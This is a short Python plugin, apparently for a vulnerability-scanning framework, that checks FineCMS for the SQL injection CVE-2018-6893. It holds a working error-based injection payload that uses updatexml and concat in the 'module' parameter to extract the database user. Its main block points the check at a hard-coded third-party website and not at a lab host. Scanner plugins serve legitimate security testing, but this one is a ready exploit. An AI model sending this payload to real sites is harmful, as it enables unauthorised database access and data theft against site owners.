#!/usr/bin/env python
#-*- encoding:utf-8 -*-
#ref https://www.t00ls.net/thread-44256-1-1.html CVE-2018-6893
# https://xianzhi.aliyun.com/forum/topic/2050

import random
def assign(service, arg):
    if service == "finecms":
        return True, arg


def audit(arg):
    payload = arg + "index.php?s=member&c=api&m=checktitle&id=13&title=123&module=news,(select (updatexml(1,concat(0x5e24,(select user()),0x5e24),1)))c,admin"
    code, head, body, redirect, log = hackhttp.http(payload)
    if 'syntax' in body:
        security_hole("SQL Inject:" + payload)

                        

if __name__ == '__main__':
    from dummy import *
    audit(assign('finecms', 'http://www.wfeng.net/')[1]) 
